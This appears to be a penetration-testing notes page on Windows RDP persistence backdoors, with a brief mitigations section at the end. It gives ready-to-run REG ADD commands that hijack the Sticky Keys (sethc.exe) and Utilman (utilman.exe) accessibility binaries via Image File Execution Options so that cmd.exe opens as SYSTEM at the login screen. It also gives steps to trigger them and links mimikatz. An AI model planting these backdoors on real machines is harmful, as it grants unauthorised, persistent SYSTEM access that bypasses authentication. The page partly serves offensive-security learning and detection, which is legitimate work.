# RDP backdoors

{% embed url="https://github.com/gentilkiwi/mimikatz/releases" %}

## <mark style="color:red;">Sticky Keys</mark>

Windows supports a feature called Sticky Keys, which is an Accessibility feature built into the OS and available pre-logon (at the login screen, either via a physical console or via Remote Desktop). It runs as SYSTEM.

If you set Sethc.exe (Sticky Keys) to spawn cmd.exe, you have a backdoor you can use if you are locked out of a box — you have SYSTEM access, so you can do anything even without an account. You can do this by either replacing sethc.exe with cmd.exe — this requires a reboot, and physical access to the box — or just set the registry key using the command below.

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

The box is now permanently backdoored. Just Remote Desktop in and at the login screen, hit F5 a bunch of times.

## <mark style="color:red;">Utilman</mark>

t’s exactly the same as StickyKeys, just trojan utilman.exe instead. At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

## <mark style="color:red;">Mitigations</mark>

{% embed url="https://github.com/ztgrace/sticky_keys_hunter" %}

**Group Policy** — use Group Policy to log off disconnected sessions, either immediately or soon after the user disconnects. This will NOT be popular in IT environments — but the risk is now completely real that they can very easily — with one built in command — be hijacked more or less silently in the real world. I would also log off idle sessions.

